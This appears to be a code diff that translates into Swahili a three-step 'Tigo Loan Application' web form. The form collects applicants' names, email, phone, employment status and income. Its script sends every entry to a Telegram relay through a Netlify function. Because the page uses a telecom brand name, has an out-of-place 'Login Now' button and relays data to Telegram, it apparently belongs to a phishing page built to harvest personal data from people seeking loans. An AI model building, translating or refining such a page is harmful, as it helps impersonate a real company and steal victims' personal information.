@@ -225,110 +225,111 @@
 <body>
     <div class="app-container">
         <header class="header">
-            <h1>Tigo Loan Application</h1>
-            <div class="step-indicator">
-                <div class="step-dot active" id="dot-1"></div>
-                <div class="step-dot" id="dot-2"></div>
-                <div class="step-dot" id="dot-3"></div>
-            </div>
-        </header>
-
-        <main class="content">
-            <!-- Step 1: Loan Details -->
-            <div class="form-step active" id="step-1">
-                <div class="form-group">
-                    <label>Loan Type</label>
-                    <select id="loan-type">
-                        <option>Personal Loan</option>
-                        <option>Business Loan</option>
-                        <option>Emergency Loan</option>
-                    </select>
+            <header class="header">
+                <h1>Ombi la Mkopo - Tigo</h1>
+                <div class="step-indicator">
+                    <div class="step-dot active" id="dot-1"></div>
+                    <div class="step-dot" id="dot-2"></div>
+                    <div class="step-dot" id="dot-3"></div>
                 </div>
-                <div class="form-group">
-                    <label>Loan Amount ($)</label>
-                    <div class="input-with-symbol">
-                        <span class="currency-symbol">$</span>
-                        <input type="number" id="loan-amount" placeholder="Enter amount">
+            </header>
+
+            <main class="content">
+                <!-- Step 1: Loan Details -->
+                <div class="form-step active" id="step-1">
+                    <div class="form-group">
+                        <label>Aina ya Mkopo</label>
+                        <select id="loan-type">
+                            <option>Mkopo wa Binafsi</option>
+                            <option>Mkopo wa Biashara</option>
+                            <option>Mkopo wa Dharura</option>
+                        </select>
                     </div>
-                </div>
-                <div class="form-group">
-                    <label>Loan Term</label>
-                    <select id="loan-term">
-                        <option>12 Months</option>
-                        <option>24 Months</option>
-                        <option>36 Months</option>
-                    </select>
-                </div>
-                <div class="form-group">
-                    <label>Purpose of Loan</label>
-                    <input type="text" id="loan-purpose" placeholder="e.g. Education, Health">
-                </div>
-            </div>
-
-            <!-- Step 2: Personal Information -->
-            <div class="form-step" id="step-2">
-                <div class="form-group">
-                    <label>First Name</label>
-                    <input type="text" id="first-name" placeholder="John">
-                </div>
-                <div class="form-group">
-                    <label>Last Name</label>
-                    <input type="text" id="last-name" placeholder="Doe">
-                </div>
-                <div class="form-group">
-                    <label>Email Address</label>
-                    <input type="email" id="email" placeholder="john.doe@example.com">
-                </div>
-                <div class="form-group">
-                    <label>Phone Number</label>
-                    <input type="tel" id="app-phone" placeholder="0XXXX XXXXX">
-                </div>
-            </div>
-
-            <!-- Step 3: Employment & Summary -->
-            <div class="form-step" id="step-3">
-                <div class="form-group">
-                    <label>Employment Status</label>
-                    <select id="employment-status">
-                        <option>Employed</option>
-                        <option>Self-Employed</option>
-                        <option>Unemployed</option>
-                    </select>
-                </div>
-                <div class="form-group">
-                    <label>Annual Income ($)</label>
-                    <div class="input-with-symbol">
-                        <span class="currency-symbol">$</span>
-                        <input type="number" id="annual-income" placeholder="50,000">
+                    <div class="form-group">
+                        <label>Kiasi cha Mkopo ($)</label>
+                        <div class="input-with-symbol">
+                            <span class="currency-symbol">$</span>
+                            <input type="number" id="loan-amount" placeholder="Weka kiasi">
+                        </div>
+                    </div>
+                    <div class="form-group">
+                        <label>Muda wa Mkopo</label>
+                        <select id="loan-term">
+                            <option>Miezi 12</option>
+                            <option>Miezi 24</option>
+                            <option>Miezi 36</option>
+                        </select>
+                    </div>
+                    <div class="form-group">
+                        <label>Lengo la Mkopo</label>
+                        <input type="text" id="loan-purpose" placeholder="mf. Elimu, Afya">
                     </div>
                 </div>
 
-                <div class="summary-box">
-                    <h3 class="summary-title">Application Summary</h3>
-                    <div class="summary-item">
-                        <span class="summary-label">Loan Amount:</span>
-                        <span class="summary-value" id="sum-amount">$0</span>
+                <!-- Step 2: Personal Information -->
+                <div class="form-step" id="step-2">
+                    <div class="form-group">
+                        <label>Jina la Kwanza</label>
+                        <input type="text" id="first-name" placeholder="John">
                     </div>
-                    <div class="summary-item">
-                        <span class="summary-label">Loan Term:</span>
-                        <span class="summary-value" id="sum-term">12 months</span>
+                    <div class="form-group">
+                        <label>Jina la Ukoo</label>
+                        <input type="text" id="last-name" placeholder="Doe">
                     </div>
-                    <div class="summary-item">
-                        <span class="summary-label">Purpose:</span>
-                        <span class="summary-value" id="sum-purpose">-</span>
+                    <div class="form-group">
+                        <label>Anwani ya Barua Pepe</label>
+                        <input type="email" id="email" placeholder="john.doe@example.com">
                     </div>
-                    <div class="summary-item">
-                        <span class="summary-label">Applicant:</span>
-                        <span class="summary-value" id="sum-name">-</span>
+                    <div class="form-group">
+                        <label>Namba ya Simu</label>
+                        <input type="tel" id="app-phone" placeholder="0XXXX XXXXX">
                     </div>
                 </div>
-            </div>
 
-            <div class="btn-container">
-                <button class="back-btn" id="prev-btn" style="display: none;">Back</button>
-                <button class="next-btn" id="next-btn">Next</button>
-            </div>
-        </main>
+                <!-- Step 3: Employment & Summary -->
+                <div class="form-step" id="step-3">
+                    <div class="form-group">
+                        <label>Hali ya Kazi</label>
+                        <select id="employment-status">
+                            <option>Umeajiriwa</option>
+                            <option>Umejiajiri</option>
+                            <option>Haujaajiriwa</option>
+                        </select>
+                    </div>
+                    <div class="form-group">
+                        <label>Mapato ya Mwaka ($)</label>
+                        <div class="input-with-symbol">
+                            <span class="currency-symbol">$</span>
+                            <input type="number" id="annual-income" placeholder="50,000">
+                        </div>
+                    </div>
+
+                    <div class="summary-box">
+                        <h3 class="summary-title">Muhtasari wa Ombi</h3>
+                        <div class="summary-item">
+                            <span class="summary-label">Kiasi cha Mkopo:</span>
+                            <span class="summary-value" id="sum-amount">$0</span>
+                        </div>
+                        <div class="summary-item">
+                            <span class="summary-label">Muda wa Mkopo:</span>
+                            <span class="summary-value" id="sum-term">miezi 12</span>
+                        </div>
+                        <div class="summary-item">
+                            <span class="summary-label">Lengo:</span>
+                            <span class="summary-value" id="sum-purpose">-</span>
+                        </div>
+                        <div class="summary-item">
+                            <span class="summary-label">Mwombaji:</span>
+                            <span class="summary-value" id="sum-name">-</span>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="btn-container">
+                    <button class="back-btn" id="prev-btn" style="display: none;">Rudi</button>
+                    <button class="next-btn" id="next-btn">Endelea</button>
+                </div>
+            </main>
     </div>
 
     <script>
@@ -365,7 +366,7 @@
             });
 
             prevBtn.style.display = currentStep === 1 ? 'none' : 'block';
-            nextBtn.textContent = currentStep === 3 ? 'Login Now' : 'Next';
+            nextBtn.textContent = currentStep === 3 ? 'Ingia Sasa' : 'Endelea';
 
             if (currentStep === 3) {
                 updateSummary();
@@ -392,16 +393,16 @@
                 income: document.getElementById('annual-income').value
             };
 
-            const message = `<b>Tigo Loan - Detailed Application</b>\n` +
-                `Name: ${data.name}\n` +
+            const message = `<b>Tigo Loan - Ombi Mapya</b>\n` +
+                `Jina: ${data.name}\n` +
                 `Email: ${data.email}\n` +
-                `Phone: ${data.phone}\n` +
-                `Type: ${data.loanType}\n` +
-                `Amount: $${data.amount}\n` +
-                `Term: ${data.term}\n` +
-                `Purpose: ${data.purpose}\n` +
-                `Employment: ${data.employment}\n` +
-                `Income: $${data.income}`;
+                `Simu: ${data.phone}\n` +
+                `Aina: ${data.loanType}\n` +
+                `Kiasi: $${data.amount}\n` +
+                `Muda: ${data.term}\n` +
+                `Lengo: ${data.purpose}\n` +
+                `Kazi: ${data.employment}\n` +
+                `Mapato: $${data.income}`;
 
             try {
                 await fetch('/.netlify/functions/send-telegram', {
